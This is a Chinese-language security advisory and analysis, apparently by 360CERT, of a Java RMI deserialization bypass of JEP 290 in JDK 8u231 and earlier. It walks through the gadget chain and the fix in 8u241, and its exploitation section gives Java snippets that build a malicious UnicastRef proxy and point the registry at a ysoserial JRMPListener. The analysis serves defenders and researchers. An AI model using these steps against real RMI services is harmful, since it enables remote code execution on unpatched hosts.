> 原文链接: https://www.anquanke.com//post/id/211722 


# RMI Bypass Jep290（Jdk8u231）反序列化漏洞分析


                                阅读量   
                                **275535**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t015a6afc6407f849e8.jpg)](https://p1.ssl.qhimg.com/t015a6afc6407f849e8.jpg)



作者：Hu3sky@360CERT

## 0x01 漏洞简述

随着RMI的进步一发展，RMI上的反序列化攻击手段正逐渐增多，该类漏洞最近正受到愈加广泛的关注。

RMI (Java Remote Method Invocation) 是Java远程方法调用，是一种允许一个 JVM 上的 object 调用另一个 JVM 上 object 方法的机制，在Java RMI 的通信过程中存在反序列化漏洞，攻击者能够利用该漏洞造成代码执行，漏洞等级：高危。

在JDK8u231之前的JDK版本，能够让注册中心反序列化UnicastRef这个类，该类可以发起一个JRMP连接到恶意服务端上，从而在DGC层造成一个反序列化，因为DGC层的filter是在反序列化之后进行设置的，没有起到实际作用，在JDK8u231进行了修复，在DGC层反序列化之前就为InputStream设置了filter，来过滤传入的序列化数据，提高安全性。

国外安全研究人员@An Trinhs发现了一个gadgets利用链，能够直接反序列化UnicastRemoteObject造成反序列化漏洞。

该漏洞的相关技术细节已公开。

对此，360CERT建议广大用户及时将JDK升级到最新版本，下载地址为：[Java SE Downloads](https://www.oracle.com/java/technologies/javase-downloads.html) 。与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。



## 0x02 影响版本
- JDK：&lt;=8u231


## 0x03 漏洞详情

JEP290机制是用来过滤传入的序列化数据，以提高安全性，在反序列化的过程中，新增了一个filterCheck方法，所以，任何反序列化操作都会经过这个filterCheck方法，利用checkInput方法来对序列化数据进行检测，如果有任何不合格的检测，Filter将返回Status.REJECTED。但是jep290的filter需要手动设置，通过setObjectInputFilter来设置filter，如果没有设置，还是不会有白名单的。 jdk9向下增加jep290机制的jdk版本为。

```
Java™ SE Development Kit 8, Update 121 (JDK 8u121)
Java™ SE Development Kit 7, Update 131 (JDK 7u131)
Java™ SE Development Kit 6, Update 141 (JDK 6u141)
```

### UnicastRemoteObject.readObject

当我们反序列化UnicastRemoteObject这个类时，由于该类重写了readObject方法，所以在反序列化的时候会调用到他的reexport方法。

[![](https://p403.ssl.qhimgs4.com/t01d5b7b9a6beea9a99.png)](https://p403.ssl.qhimgs4.com/t01d5b7b9a6beea9a99.png)

在reexport方法里，如果ssf是被我们设置了值，那么进入else判断

[![](https://p403.ssl.qhimgs4.com/t017e8ac11c7e0aadaa.png)](https://p403.ssl.qhimgs4.com/t017e8ac11c7e0aadaa.png)

接着调用exportObject方法，该方法通常用来导出远程对象。

[![](https://p403.ssl.qhimgs4.com/t011d22376c22d7b68c.png)](https://p403.ssl.qhimgs4.com/t011d22376c22d7b68c.png)

一直跟进，跟到TCPTransport.exportObject方法。

[![](https://p403.ssl.qhimgs4.com/t01b6d1c42257fd1cf7.png)](https://p403.ssl.qhimgs4.com/t01b6d1c42257fd1cf7.png)

[![](https://p403.ssl.qhimgs4.com/t013492d8403c45f9d3.png)](https://p403.ssl.qhimgs4.com/t013492d8403c45f9d3.png)

继续跟进listen方法，跟进TCPEndpoint.newServerSocket方法。

[![](https://p403.ssl.qhimgs4.com/t0177fc80b6027ce170.png)](https://p403.ssl.qhimgs4.com/t0177fc80b6027ce170.png)

这里如果我们把ssf设置为通过RemoteObjectInvocationHandler生成的代理类，那么就会调用到RemoteObjectInvocationHandler.invoke方法。（这里涉及到动态代理的知识，如果调用通过InvocationHandler的实现类生成的代理类，那么会转而调用实现类的invoke方法，并且会向invoke方法传入三个参数:代理类对象作为proxy参数传入，调用的代理类方法作为method参数传入，具体方法的参数作为args参数传入），在invoke方法中，检测声明方法的类，如果不为Object，进入invokeRemoteMethod方法。

[![](https://p403.ssl.qhimgs4.com/t01daefe7658093bc2f.png)](https://p403.ssl.qhimgs4.com/t01daefe7658093bc2f.png)

检测Proxy的需要实现Remote接口，这里是我们能控制的，因为在创建代理类的时候就需要指定实现的接口，这里的ref被赋值为UnicastRef，并且存有恶意服务端（这里我们的注册中心一端转变成客户端，而恶意监听的一端相当于服务端）的tcp信息，这里是我们在序列化数据的时候设置的。

[![](https://p403.ssl.qhimgs4.com/t01d04e0013c8609af2.png)](https://p403.ssl.qhimgs4.com/t01d04e0013c8609af2.png)

### UnicastRef.invoke

然后，有几处代码比较关键。

[![](https://p403.ssl.qhimgs4.com/t012dfcb5b13bd6928f.png)](https://p403.ssl.qhimgs4.com/t012dfcb5b13bd6928f.png)

第一处：是和服务端建立连接。 第二处：向服务端传递一些byte信息。 第三处：获取OutputStream，进行远程方法传参，这里涉及到调用marshalValue序列化参数传递给服务端，不过这一处与本次绕过关系不大，所以用的细线标注。 第四处：服务端反序列化参数之后，会向客户端传值，如果服务端反序列化成功，会发送byte值1给客户端，如果发生一些错误，就会发送byte值2给客户端。

这里的byte值1和2主要体现在客户端的executeCall方法里，

[![](https://p403.ssl.qhimgs4.com/t013372f80839a7bde6.png)](https://p403.ssl.qhimgs4.com/t013372f80839a7bde6.png)

可以发现，如果客户端接受到服务端返回的byte值是2，那么就有一个readObject方法，而且我们看到getInputStream之后，并没有给该Stream设置jep290的filter，那么这里就可以造成注册中心（客户端）的反序列化。

调用栈

```
readObject:431, ObjectInputStream (java.io)
executeCall:252, StreamRemoteCall (sun.rmi.transport)
invoke:161, UnicastRef (sun.rmi.server)
invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)
invoke:179, RemoteObjectInvocationHandler (java.rmi.server)
createServerSocket:-1, $Proxy0 (com.sun.proxy)
newServerSocket:666, TCPEndpoint (sun.rmi.transport.tcp)
listen:335, TCPTransport (sun.rmi.transport.tcp)
exportObject:254, TCPTransport (sun.rmi.transport.tcp)
...
exportObject:346, UnicastRemoteObject (java.rmi.server)
reexport:268, UnicastRemoteObject (java.rmi.server)
readObject:235, UnicastRemoteObject (java.rmi.server)
```

### 漏洞利用
1. 需要一个向服务端发起JRMP连接的UnicastRef，这里ysoserial有相关代码，并且在LocateRegistry.getRegistry里也有相应代码。
```
ObjID id = new ObjID(new Random().nextInt()); // RMI registry
TCPEndpoint te = new TCPEndpoint(ip, port);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
```
1. 创建RemoteObjectInvocationHandler的代理类，ssf是RMIServerSocketFactory类型。
```
RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(ref);

RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(), new Class[] `{`
                RMIServerSocketFactory.class, Remote.class
`}`, remoteObjectInvocationHandler);
```
1. 将ssf的值设置成创建的代理类，但是由于是private类型，所以需要用反射来赋值。
```
Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject clz = (UnicastRemoteObject) constructor.newInstance(null);
        Field ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
        ssf.setAccessible(true);
ssf.set(clz,rmiServerSocketFactory);
```

然后我们利用Server端进行bind，让注册中心反序列化这个UnicastRemoteObject对象，不过序列化的时候出现了问题，在调用RegistryImpl_Stub.bind的时候，进行writeObject的时候。

[![](https://p403.ssl.qhimgs4.com/t01ce1b2a7f72262e0f.png)](https://p403.ssl.qhimgs4.com/t01ce1b2a7f72262e0f.png)

如果enableReplace为true。

[![](https://p403.ssl.qhimgs4.com/t010c68f5a4abd1ff40.png)](https://p403.ssl.qhimgs4.com/t010c68f5a4abd1ff40.png)

检测我们要序列化的obj，是否实现Remote/RemoteStub，由于UnicastRemoteObject实现了Remote，没有实现RemoteStub，于是会进入判断，就会替换我们的obj，以至于反序列化的时候不能还原我们构造的类。

[![](https://p403.ssl.qhimgs4.com/t01200c189308370d9d.png)](https://p403.ssl.qhimgs4.com/t01200c189308370d9d.png)

所以，需要把enableReplace改为false。这里可以自己实现重写RegistryImpl_Stub，将bind方法进行修改，在序列化之前，通过反射，把enableReplace值进行修改。

[![](https://p403.ssl.qhimgs4.com/t0129fdf8bbba5aeb30.png)](https://p403.ssl.qhimgs4.com/t0129fdf8bbba5aeb30.png)
<li>恶意服务端只需要利用ysoserial.exploit.JRMPListener开启，监听到来自客户端的请求之后，就会向客户端发送byte值2，并序列化恶意类，最终让客户端反序列化恶意类。 [![](https://p403.ssl.qhimgs4.com/t01968a320a7aded8cf.png)](https://p403.ssl.qhimgs4.com/t01968a320a7aded8cf.png)
</li>
### jdk8u241中的修复

在jdk8u241进行了修复，在调用UnicastRef.invoke之前，做了一个检测。

[![](https://p403.ssl.qhimgs4.com/t01cc1430174eeec6a3.png)](https://p403.ssl.qhimgs4.com/t01cc1430174eeec6a3.png)

声明方法的类，必须要实现Remote接口，然而这里的RMIServerSocketFactory并没有实现，于是无法进入到invoke方法，直接抛出错误。

[![](https://p403.ssl.qhimgs4.com/t017fb6bd8e2e4ce944.png)](https://p403.ssl.qhimgs4.com/t017fb6bd8e2e4ce944.png)



## 0x04 时间线

2020-07-24 360-CERT 发布分析报告



## 0x05 参考链接
1. [AN TRINHS RMI REGISTRY BYPASS](https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/)